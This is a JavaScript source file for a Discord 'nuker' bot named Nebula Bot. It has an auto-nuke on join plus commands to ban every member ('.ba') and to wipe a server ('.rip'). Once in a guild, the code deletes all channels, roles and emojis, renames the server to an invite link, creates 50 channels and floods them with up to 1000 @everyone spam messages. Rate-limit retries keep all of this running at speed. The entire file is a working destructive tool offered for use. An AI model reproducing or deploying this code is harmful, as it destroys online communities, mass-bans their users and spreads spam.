const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');

dotenv.config();

// ====== DISCORD BOT SETUP ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildBans,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== WEB SERVER FOR PORT 3000 ======
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Nebula Bot is online and auto-nuking...');
});

app.listen(PORT, () => {
  console.log(`🌐 Web server running on http://localhost:${PORT}`);
});

// ====== RATE LIMIT HANDLER (MINIMAL OVERHEAD) ======
async function handleRateLimit(promiseFn) {
  let retries = 0;
  while (retries < 5) {
    try {
      return await promiseFn();
    } catch (error) {
      if (error.code === 429) {
        const retryAfter = error.retry_after || 1000;
        await new Promise(resolve => setTimeout(resolve, retryAfter));
        retries++;
      } else {
        return null;
      }
    }
  }
  return null;
}

// ====== SAFE LEAVE ======
async function safeLeaveGuild(guild) {
  try {
    await handleRateLimit(() => guild.leave());
    console.log('🚪 Left server.');
  } catch (err) {
    if (![50001, 404, 403].includes(err.code)) console.error('⚠️ Leave failed:', err.message);
  }
}

client.on('ready', () => {
  console.log(`🚀 Logged in as ${client.user.tag}`);
});

// ====== AUTO-NUKE ON JOIN ======
client.on('guildCreate', async (guild) => {
  const BLOCKED_GUILD_ID = '1345474714331643956';
  const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
  const channelName = 'neb-was-here';

  if (guild.id === BLOCKED_GUILD_ID) {
    console.log(`🚫 Blocked guild: ${guild.name}`);
    await safeLeaveGuild(guild);
    return;
  }

  console.log(`🎯 Auto-nuking: ${guild.name}`);

  let sent = 0;

  try {
    // Delete everything in parallel
    await Promise.allSettled([
      // Delete channels
      (async () => {
        await Promise.allSettled(guild.channels.cache.map(ch =>
          handleRateLimit(() => ch.delete().catch(() => {}))
        ));
        console.log('🧹 Channels deleted');
      })(),

      // Delete roles
      (async () => {
        await Promise.allSettled(guild.roles.cache
          .filter(r => r.name !== '@everyone' && !r.managed)
          .map(r => handleRateLimit(() => r.delete().catch(() => {})))
        );
        console.log('🛡️ Roles deleted');
      })(),

      // Delete emojis
      (async () => {
        await Promise.allSettled(guild.emojis.cache.map(e =>
          handleRateLimit(() => e.delete().catch(() => {}))
        ));
        console.log('🖼️ Emojis deleted');
      })(),

      // Rename server
      (async () => {
        await handleRateLimit(() => guild.setName('discord.gg/migh').catch(() => {}));
        console.log('📛 Server renamed');
      })()
    ]);

    // Create 50 channels — FAST batch
    const createdChannels = [];
    const createPromises = [];

    for (let i = 0; i < 50; i++) {
      const p = handleRateLimit(() => guild.channels.create({ name: `${channelName}-${i + 1}` }))
        .then(ch => {
          if (ch) createdChannels.push(ch);
        });
      createPromises.push(p);
    }

    await Promise.allSettled(createPromises);
    console.log(`✅ Created ${createdChannels.length} channels`);

    if (createdChannels.length === 0) {
      console.log('❌ No channels created. Aborting.');
      await safeLeaveGuild(guild);
      return;
    }

    // SPAM: 20 messages per channel, up to 1000 total
    const MAX_MESSAGES = 1000;
    const spamPromises = [];

    for (const channel of createdChannels) {
      for (let i = 0; i < 20 && sent < MAX_MESSAGES; i++) {
        spamPromises.push(
          handleRateLimit(() => channel.send(spamMessage))
            .then(() => { if (++sent % 100 === 0) console.log(`📨 Sent: ${sent}`); })
            .catch(() => {})
        );
      }
    }

    // Fire all spam at once — MAX SPEED
    await Promise.allSettled(spamPromises);
    console.log(`🔥 Sent ${sent} messages`);

    // Leave if successful
    if (sent >= 950) await safeLeaveGuild(guild);
  } catch (err) {
    console.error('🚨 Auto-nuke failed:', err.message);
    await safeLeaveGuild(guild);
  }
});

// ====== MESSAGE HANDLER (.ba, .help, .servers) ======
client.on('messageCreate', async (message) => {
  if (!message.content.startsWith('.') || message.author.bot) return;

  const args = message.content.slice(1).trim().split(/ +/);
  const command = args[0].toLowerCase();
  const BLOCKED_GUILD_ID = '1345474714331643956';

  // ===== HELP =====
  if (command === 'help') {
    const embed = new EmbedBuilder()
      .setTitle('🤖 Nebula Bot')
      .addFields(
        { name: '.rip', value: 'Nuke server' },
        { name: '.ba', value: 'Ban all members' },
        { name: '.help', value: 'Show this' }
      )
      .setColor('#ff0000');

    message.author.send({ embeds: [embed] }).catch(() => {});
    message.reply('📬 Help sent to DMs').catch(() => {});
  }

  // ===== SERVERS (OWNER ONLY) =====
  if (command === 'servers' && message.author.id === '1400281740978815118') {
    const embed = new EmbedBuilder()
      .setTitle('🌐 Servers')
      .setDescription(client.guilds.cache.map(g => `🔹 ${g.name} (${g.memberCount} members)`).join('\n'))
      .setColor('#00ffff');

    message.author.send({ embeds: [embed] }).catch(() => {});
    message.reply('✅ Server list sent to DMs').catch(() => {});
  }

  // Block .ba and .rip in protected server
  if (['ba', 'rip'].includes(command) && message.guild.id === BLOCKED_GUILD_ID) {
    return message.reply('🚫 Disabled here.');
  }

  // ===== BAN ALL =====
  if (command === 'ba') {
    if (!message.member.permissions.has('BAN_MEMBERS')) {
      return message.reply('❌ No permission.');
    }

    const guild = message.guild;
    const ownerID = guild.ownerId;

    await message.channel.send('🔍 Fetching members...');

    const members = await guild.members.fetch().catch(() => new Map());
    const toBan = members.filter(m => m.id !== ownerID && !m.user.bot && m.bannable);

    let banned = 0, failed = 0;

    await message.reply(`🔪 Banning ${toBan.size} members...`);

    await Promise.allSettled([...toBan.values()].map(member =>
      handleRateLimit(() => guild.members.ban(member, { reason: 'Nebula', deleteMessageSeconds: 604800 }))
        .then(() => banned++)
        .catch(() => failed++)
    ));

    await message.reply(`✅ Done. Banned: ${banned}, Failed: ${failed}`);
  }

  // ===== RIP (Manual) =====
  if (command === 'rip') {
    const g = message.guild;
    const spam = '@everyone Nebula\'s return is here discord.gg/migh';
    let sent = 0;

    try {
      // Delete all
      await Promise.allSettled([
        ...g.channels.cache.map(c => handleRateLimit(() => c.delete().catch(() => {}))),
        ...g.roles.cache.filter(r => r.name !== '@everyone' && !r.managed).map(r => handleRateLimit(() => r.delete().catch(() => {}))),
        ...g.emojis.cache.map(e => handleRateLimit(() => e.delete().catch(() => {})))
      ]);

      await handleRateLimit(() => g.setName('discord.gg/migh').catch(() => {}));

      // Create 50 channels
      const channels = [];
      for (let i = 0; i < 50; i++) {
        const ch = await handleRateLimit(() => g.channels.create({ name: `neb-was-here-${i + 1}` }));
        if (ch) channels.push(ch);
      }

      // Spam 1000 messages
      for (const ch of channels) {
        for (let i = 0; i < 20 && sent < 1000; i++) {
          await handleRateLimit(() => ch.send(spam)).catch(() => {});
          sent++;
        }
      }

      await message.reply(`✅ Nuked. Sent ${sent} messages.`);
      if (sent > 950) await safeLeaveGuild(g);
    } catch (err) {
      await message.reply('❌ Failed');
    }
  }
});

// ====== LOGIN ======
client.login(process.env.TOKEN);
